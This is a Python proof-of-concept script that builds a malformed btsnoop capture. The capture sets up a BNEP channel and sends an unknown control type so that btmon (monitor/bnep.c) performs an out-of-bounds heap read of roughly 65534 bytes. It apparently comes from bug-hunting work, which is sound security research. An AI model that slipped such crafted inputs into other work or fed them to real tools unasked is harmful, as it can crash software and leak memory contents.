#!/usr/bin/env python3
"""
mk_btsnoop_bnep.py — btsnoop capture driving monitor/bnep.c unknown-control-type
hexdump defect:

    btmon -r file
      -> packet_hci_acldata -> l2cap_packet -> chan table (psm 0x000F = BNEP)
      -> bnep_packet -> bnep_table[0x01 Control].func = bnep_control(..., hdr_len=-1)
      -> ctype NOT in bnep_control_table (0x00..0x06)
      -> packet_hexdump(frame->data, hdr_len - 1)   /* -2 -> uint16 65534 */
      -> 65534-byte OOB heap read, hexdumped to stdout

Sequence mirrors mk_btsnoop_sdp.py:
    1. L2CAP Connection Request (PSM 0x000F)  -> chan_add
    2. Connection Response                    -> channel granted
    3. Data on SCID: BNEP Control, unknown ctype
"""
import struct, sys

BTSNOOP_HDR = b"btsnoop\x00" + struct.pack(">II", 1, 1001)

def acl_record(data: bytes, flags: int = 0x01) -> bytes:
    return struct.pack(">IIIIQ", len(data), len(data), flags, 0,
                       0x00E03AB44A676000) + data

def hci_acl(handle_flags: int, payload: bytes) -> bytes:
    return struct.pack("<HH", handle_flags, len(payload)) + payload

def l2cap(ci: int, payload: bytes) -> bytes:
    return struct.pack("<HH", len(payload), ci) + payload

def l2cap_conn_req(ident, psm, scid):
    sig = struct.pack("<BBHH", 0x02, ident, 4, psm) + struct.pack("<H", scid)
    return l2cap(0x0001, sig)

def l2cap_conn_rsp(ident, dcid, scid):
    sig = struct.pack("<BBHHHHH", 0x03, ident, 8, dcid, scid, 0x0000, 0x0000)
    return l2cap(0x0001, sig)

def main(ctype: int, out: str):
    SCID, DCID = 0x0040, 0x0041
    recs = []
    # 1) seed channel: psm 0x000F (BNEP)
    recs.append(acl_record(hci_acl(0x0001, l2cap_conn_req(0x01, 0x000F, SCID)),
                           flags=0x00))
    # 2) granted
    recs.append(acl_record(hci_acl(0x0001, l2cap_conn_rsp(0x01, DCID, SCID)),
                           flags=0x01))
    # 3) BNEP frame: type=0x01 (Control), ctype=UNKNOWN, small filler payload.
    #    After ctype is consumed, frame->data points at filler; hexdump then
    #    reads 65534 bytes from there.
    bnep = bytes([0x01, ctype]) + b"\xaa\xbb\xcc\xdd"
    recs.append(acl_record(hci_acl(0x0001, l2cap(SCID, bnep)), flags=0x01))

    with open(out, "wb") as f:
        f.write(BTSNOOP_HDR)
        for r in recs:
            f.write(r)
    print(f"wrote {out}: {len(recs)} records, ctype=0x{ctype:02x}")

if __name__ == "__main__":
    ct = int(sys.argv[1], 0) if len(sys.argv) > 1 else 0x07   # unknown type
    out = sys.argv[2] if len(sys.argv) > 2 else "/home/box/BTHunt/out/bnep_unknown.btsnoop"
    main(ct, out)
